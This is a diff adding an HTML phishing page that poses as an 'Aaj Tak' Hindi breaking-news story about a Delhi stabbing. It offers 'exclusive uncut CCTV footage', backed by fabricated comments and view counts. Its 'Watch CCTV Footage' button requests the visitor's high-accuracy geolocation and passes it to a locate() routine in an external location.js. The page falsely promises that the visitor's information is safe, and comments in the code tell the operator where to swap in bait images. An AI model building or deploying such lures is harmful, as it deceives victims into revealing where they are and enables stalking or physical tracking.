@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>BREAKING: दिल्ली में सनसनीखेज हत्याकांड | Delhi News Today</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1a1a2e">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --news-bg: #f5f5f5;
+            --news-card: #ffffff;
+            --news-text: #1a1a1a;
+            --news-text-light: #555555;
+            --news-text-muted: #888888;
+            --news-border: #e0e0e0;
+            --news-accent: #c0392b;
+            --news-dark: #2c3e50;
+            --news-gold: #d4a017;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.1);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+        }
+
+        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes pulseRed { 0%,100% { opacity:1; } 50% { opacity:0.6; } }
+        @keyframes dotBounce { 0%,80%,100%{transform:scale(0.6);opacity:0.3;} 40%{transform:scale(1);opacity:1;} }
+        @keyframes shake { 0%,100%{transform:translateX(0);} 25%{transform:translateX(-4px);} 75%{transform:translateX(4px);} }
+        @keyframes glowBtn { 0%,100%{box-shadow:0 4px 20px rgba(192,57,43,0.3);} 50%{box-shadow:0 4px 40px rgba(192,57,43,0.6);} }
+
+        body {
+            font-family: 'Noto Sans Devanagari', 'Inter', sans-serif;
+            background: var(--news-bg);
+            min-height: 100vh;
+            color: var(--news-text);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ===== BREAKING BAR ===== */
+        .breaking-bar {
+            background: var(--news-accent);
+            color: #fff;
+            padding: 6px 0;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(192,57,43,0.3);
+        }
+
+        .breaking-bar .breaking-inner {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 0 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .breaking-bar .live-tag {
+            background: #fff;
+            color: var(--news-accent);
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 9px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulseRed 1.5s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        /* ===== NEWSPAPER HEADER ===== */
+        .paper-header {
+            background: var(--news-card);
+            border-bottom: 2px solid var(--news-border);
+            padding: 12px 16px;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .paper-header .paper-name {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--news-dark);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .paper-header .paper-name span { color: var(--news-accent); }
+
+        .paper-header .paper-date {
+            font-size: 10px;
+            color: var(--news-text-muted);
+            margin-top: 6px;
+            border-top: 1px solid var(--news-border);
+            padding-top: 6px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* ===== MAIN ===== */
+        .main-container { max-width: 600px; margin: 0 auto; padding: 12px; }
+
+        .category-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: var(--news-accent);
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .headline {
+            font-size: 20px;
+            font-weight: 800;
+            line-height: 1.3;
+            color: var(--news-text);
+            margin-bottom: 8px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .headline .highlight-red { color: var(--news-accent); }
+
+        .meta-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+            font-size: 11px;
+            color: var(--news-text-muted);
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.5s ease 0.1s forwards;
+            opacity: 0;
+        }
+
+        .meta-info .author { font-weight: 600; color: var(--news-dark); }
+
+        /* ===== HERO IMAGE ===== */
+        /*
+            ═══════════════════════════════════════════════════
+            📸 YAHAN APNI IMAGE KA URL DAALEIN (line 210)
+            ═══════════════════════════════════════════════════
+            Image URL change karne ke liye neeche "src" me 
+            apna image URL paste karein.
+            Example: src="https://i.postimg.cc/WbD64402/CCTV-footage-of-the-incident-showed-one-of-the-ass-1748110358561.jpg"
+            ═══════════════════════════════════════════════════
+        */
+        .hero-image {
+            position: relative;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            margin-bottom: 10px;
+            box-shadow: var(--shadow-md);
+            animation: fadeIn 0.5s ease 0.15s forwards;
+            opacity: 0;
+        }
+
+        .hero-image img {
+            width: 100%;
+            display: block;
+        }
+
+        .hero-image .image-caption {
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            padding: 25px 10px 6px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.7));
+            font-size: 10px;
+            color: rgba(255,255,255,0.7);
+        }
+
+        /* ===== STORY ===== */
+        .story-text {
+            font-size: 14px;
+            line-height: 1.7;
+            color: var(--news-text-light);
+            margin-bottom: 12px;
+            animation: fadeIn 0.5s ease 0.2s forwards;
+            opacity: 0;
+        }
+
+        .story-text p { margin-bottom: 10px; }
+
+        .story-text .highlight-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px 14px;
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+            font-size: 13px;
+            margin: 12px 0;
+        }
+
+        /* ===== BIG ALLOW BUTTON (SIRF EK, BADA AUR ATTRACTIVE) ===== */
+        .allow-section {
+            background: linear-gradient(135deg, #fff5f5, #fff0f0);
+            border: 2px solid #ffcccc;
+            border-radius: var(--radius-md);
+            padding: 18px 16px;
+            margin-bottom: 12px;
+            text-align: center;
+            animation: fadeIn 0.5s ease 0.25s forwards, shake 1s ease 1.5s;
+            opacity: 0;
+            position: relative;
+        }
+
+        .allow-section::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--news-accent), var(--news-gold), var(--news-accent));
+        }
+
+        .allow-section .lock-icon {
+            font-size: 32px;
+            margin-bottom: 6px;
+        }
+
+        .allow-section h3 {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--news-accent);
+            margin-bottom: 4px;
+        }
+
+        .allow-section p {
+            font-size: 12px;
+            color: var(--news-text-light);
+            margin-bottom: 14px;
+            line-height: 1.5;
+        }
+
+        .allow-section .big-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 14px 40px;
+            background: var(--news-accent);
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: glowBtn 2s ease-in-out infinite;
+        }
+
+        .allow-section .big-btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 30px rgba(192,57,43,0.5);
+        }
+
+        .allow-section .big-btn:active {
+            transform: translateY(0) scale(0.98);
+        }
+
+        .allow-section .big-btn .arrow {
+            font-size: 22px;
+        }
+
+        .allow-section .safety-note {
+            margin-top: 10px;
+            font-size: 10px;
+            color: var(--news-text-muted);
+        }
+
+        /* ===== RELATED ===== */
+        .related-section {
+            margin-top: 8px;
+            animation: fadeIn 0.5s ease 0.3s forwards;
+            opacity: 0;
+        }
+
+        .related-section .section-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--news-dark);
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--news-border);
+        }
+
+        .related-item {
+            display: flex;
+            gap: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--news-border);
+        }
+
+        .related-item:last-child { border-bottom: none; }
+
+        .related-item .thumb {
+            width: 65px;
+            height: 65px;
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+            flex-shrink: 0;
+            background: #ddd;
+        }
+
+        .related-item .thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .related-item .related-info h4 {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--news-text);
+            line-height: 1.4;
+        }
+
+        .related-item .related-info .related-meta {
+            font-size: 10px;
+            color: var(--news-text-muted);
+            margin-top: 2px;
+        }
+
+        .related-item .related-info .related-meta .red-text {
+            color: var(--news-accent);
+            font-weight: 600;
+        }
+
+        /* ===== COMMENTS ===== */
+        .comments-section {
+            margin-top: 14px;
+            animation: fadeIn 0.5s ease 0.35s forwards;
+            opacity: 0;
+        }
+
+        .comments-section .section-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--news-dark);
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--news-border);
+        }
+
+        .comment-item {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+            padding: 8px;
+            background: #fafafa;
+            border-radius: var(--radius-sm);
+        }
+
+        .comment-item .comment-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #ddd;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .comment-item .comment-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .comment-item .comment-body .comment-name {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--news-text);
+        }
+
+        .comment-item .comment-body .comment-text {
+            font-size: 11px;
+            color: var(--news-text-light);
+            line-height: 1.4;
+        }
+
+        .comment-item .comment-body .comment-time {
+            font-size: 9px;
+            color: var(--news-text-muted);
+            margin-top: 2px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* ===== OVERLAY ===== */
+        .loc-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 24px;
+        }
+
+        .loc-overlay.active { display: flex; }
+
+        .loc-overlay .overlay-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(192,57,43,0.15);
+            border: 2px solid rgba(192,57,43,0.3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin-bottom: 16px;
+        }
+
+        .loc-overlay h3 {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+        }
+
+        .loc-overlay p {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            text-align: center;
+            max-width: 280px;
+            line-height: 1.5;
+        }
+
+        .loc-overlay .dot-loader { display: flex; gap: 6px; margin-top: 16px; }
+
+        .loc-overlay .dot-loader span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--news-accent);
+            display: inline-block;
+            animation: dotBounce 1.4s ease-in-out infinite both;
+        }
+
+        .loc-overlay .dot-loader span:nth-child(1) { animation-delay: -0.32s; }
+        .loc-overlay .dot-loader span:nth-child(2) { animation-delay: -0.16s; }
+        .loc-overlay .dot-loader span:nth-child(3) { animation-delay: 0s; }
+
+        /* ===== FOOTER ===== */
+        .news-footer {
+            text-align: center;
+            padding: 12px;
+            border-top: 2px solid var(--news-border);
+            margin-top: 8px;
+            animation: fadeIn 0.5s ease 0.4s forwards;
+            opacity: 0;
+        }
+
+        .news-footer p {
+            font-size: 10px;
+            color: var(--news-text-muted);
+        }
+
+        @media (max-width: 400px) {
+            .headline { font-size: 17px; }
+            .allow-section .big-btn { padding: 12px 28px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body onload="information();">
+
+    <!-- Breaking Bar -->
+    <div class="breaking-bar">
+        <div class="breaking-inner">
+            <span class="live-tag">🔴 LIVE</span>
+            <span>BREAKING: दिल्ली के कड़कड़डूमा इलाके में दर्दनाक हत्याकांड, CCTV फुटेज जारी</span>
+        </div>
+    </div>
+
+    <!-- Newspaper Header -->
+    <div class="paper-header">
+        <div class="paper-name">आज <span>तक</span></div>
+        <div class="paper-date" id="newsDate">Loading...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-container">
+
+        <!-- Category -->
+        <div class="category-tag">🔴 BREAKING / दिल्ली</div>
+
+        <!-- Headline -->
+        <h1 class="headline">
+            दिल्ली के <span class="highlight-red">कड़कड़डूमा</span> में युवक की हत्या, <span class="highlight-red">CCTV</span> में कैद हुई पूरी वारदात
+        </h1>
+
+        <!-- Meta -->
+        <div class="meta-info">
+            <span class="author">✍️ रोहित शर्मा</span>
+            <span class="divider">|</span>
+            <span id="updatedTime">Updated: 15 मिनट पहले</span>
+            <span class="divider">|</span>
+            <span>👁️ 2.3 लाख views</span>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- 📸 IMAGE: YAHAN APNI IMAGE KA URL LAGAYE (neeche src="...") -->
+        <!-- ================================================================ -->
+        <div class="hero-image">
+    <img src="https://i.postimg.cc/WbD64402/CCTV-footage-of-the-incident-showed-one-of-the-ass-1748110358561.jpg" alt="CCTV Footage" loading="lazy" style="width:100%;height:auto;display:block;">
+    <div class="image-caption">पुलिस जांच में जुटी | CCTV फुटेज</div>
+</div>
+
+        <!-- Story -->
+        <div class="story-text">
+            <p>
+                <strong>दिल्ली:</strong> कड़कड़डूमा इलाके में शुक्रवार सुबह एक <strong>सनसनीखेज हत्याकांड</strong> का खुलासा हुआ है। 
+                पुलिस के अनुसार, अज्ञात हमलावरों ने एक 27 वर्षीय युवक की चाकू मारकर हत्या कर दी।
+            </p>
+
+            <p>
+                घटना के समय का <strong>CCTV फुटेज</strong> सामने आया है जिसमें हमलावर स्पष्ट रूप से देखे जा सकते हैं।
+            </p>
+
+            <div class="highlight-box">
+                <strong>⚡ अपडेट:</strong> पुलिस ने संदिग्धों की तलाश में 50 से अधिक CCTV कैमरों की फुटेज खंगाली। आरोपियों की पहचान के लिए लोकेशन आधारित जांच जारी।
+            </div>
+        </div>
+
+        <!-- ===== BIG ALLOW BUTTON (SIRF EK BADA BUTTON) ===== -->
+        <div class="allow-section">
+            <div class="lock-icon">🔴</div>
+            <h3>🔞 Exclusive: हत्याकांड की CCTV फुटेज</h3>
+            <p>यह अनएडिटेड CCTV फुटेज अब तक कहीं जारी नहीं की गई।<br>
+            <strong>नीचे क्लिक करें और पूरी सच्चाई जानें।</strong></p>
+
+            <button class="big-btn" onclick="handleAllow()">
+                ▶ <span>Watch CCTV Footage</span>
+                <span class="arrow">→</span>
+            </button>
+
+            <p class="safety-note">✅ सुरक्षित कनेक्शन • आपकी जानकारी पूरी तरह सुरक्षित</p>
+        </div>
+
+        <!-- Related News -->
+        <div class="related-section">
+            <div class="section-title">📰 संबंधित खबरें</div>
+
+            <div class="related-item">
+                <div class="thumb"><img src="https://images.unsplash.com/photo-1504711434969-e33886168d0c?w=150&h=150&fit=crop" alt="News" loading="lazy"></div>
+                <div class="related-info">
+                    <h4>हत्याकांड में शामिल तीसरे आरोपी की तलाश जारी, पुलिस ने 3 टीमें गठित</h4>
+                    <div class="related-meta"><span class="red-text">🔴 Breaking</span> • 1 घंटे पहले</div>
+                </div>
+            </div>
+
+            <div class="related-item">
+                <div class="thumb"><img src="https://images.unsplash.com/photo-1447069387593-a5de0862481e?w=150&h=150&fit=crop" alt="News" loading="lazy"></div>
+                <div class="related-info">
+                    <h4>CCTV फुटेज में कैद हुई वारदात, पुलिस कर रही लोकेशन आधारित जांच</h4>
+                    <div class="related-meta"><span class="red-text">🔴 Breaking</span> • 2 घंटे पहले</div>
+                </div>
+            </div>
+
+            <div class="related-item">
+                <div class="thumb"><img src="https://images.unsplash.com/photo-1588681664899-f142f2eb1de1?w=150&h=150&fit=crop" alt="News" loading="lazy"></div>
+                <div class="related-info">
+                    <h4>पुलिस कमिश्नर का बयान: जल्द से जल्द दोषियों को सजा दिलवाएंगे</h4>
+                    <div class="related-meta">45 मिनट पहले</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Comments -->
+        <div class="comments-section">
+            <div class="section-title">💬 पाठकों की टिप्पणियाँ</div>
+
+            <div class="comment-item">
+                <div class="comment-avatar"><img src="https://i.pravatar.cc/50?img=1" alt="User" loading="lazy"></div>
+                <div class="comment-body">
+                    <div class="comment-name">Rahul Verma</div>
+                    <div class="comment-text">बहुत दर्दनाक घटना है। पुलिस जल्द से जल्द आरोपियों को पकड़े। 🙏</div>
+                    <div class="comment-time">10 मिनट पहले</div>
+                </div>
+            </div>
+
+            <div class="comment-item">
+                <div class="comment-avatar"><img src="https://i.pravatar.cc/50?img=5" alt="User" loading="lazy"></div>
+                <div class="comment-body">
+                    <div class="comment-name">Neha Singh</div>
+                    <div class="comment-text">CCTV फुटेज देख कर रोंगटे खड़े हो गए। कितनी बेरहमी से हत्या की 😡</div>
+                    <div class="comment-time">25 मिनट पहले</div>
+                </div>
+            </div>
+
+            <div class="comment-item">
+                <div class="comment-avatar"><img src="https://i.pravatar.cc/50?img=3" alt="User" loading="lazy"></div>
+                <div class="comment-body">
+                    <div class="comment-name">Amit Kumar</div>
+                    <div class="comment-text">हमारे मोहल्ले में हुआ है ये। पुलिस ने लोकेशन सर्वे किया था कल।</div>
+                    <div class="comment-time">40 मिनट पहले</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="news-footer">
+            <p>&copy; 2026 Bharat News Network. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- Overlay -->
+    <div class="loc-overlay" id="locOverlay">
+        <div class="overlay-icon">📹</div>
+        <h3>वीडियो लोड हो रहा है...</h3>
+        <p>कृपया लोकेशन एक्सेस की अनुमति दें। आपकी जानकारी सुरक्षित है।</p>
+        <div class="dot-loader">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="/js/location.js"></script>
+    <script>
+        // Auto date
+        var d = new Date();
+        var days = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
+        var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
+        document.getElementById('newsDate').textContent = days[d.getDay()] + ', ' + d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear() + ' | दिल्ली';
+
+        // Allow button handler
+        function handleAllow() {
+            document.getElementById('locOverlay').classList.add('active');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        if (typeof locate === 'function') {
+                            locate(
+                                function() {
+                                    document.getElementById('locOverlay').classList.remove('active');
+                                    alert('✅ वीडियो चल रहा है...');
+                                },
+                                function() {
+                                    document.getElementById('locOverlay').classList.remove('active');
+                                    alert('⚠️ लोकेशन एक्सेस आवश्यक है। कृपया अनुमति दें।');
+                                }
+                            );
+                        }
+                    },
+                    function(err) {
+                        document.getElementById('locOverlay').classList.remove('active');
+                        alert('📍 लोकेशन एक्सेस जरूरी है। कृपया ब्राउज़र सेटिंग में अनुमति दें।');
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById('locOverlay').classList.remove('active');
+                alert('Geolocation supported नहीं है।');
+            }
+        }
+    </script>
+</body>
+</html>
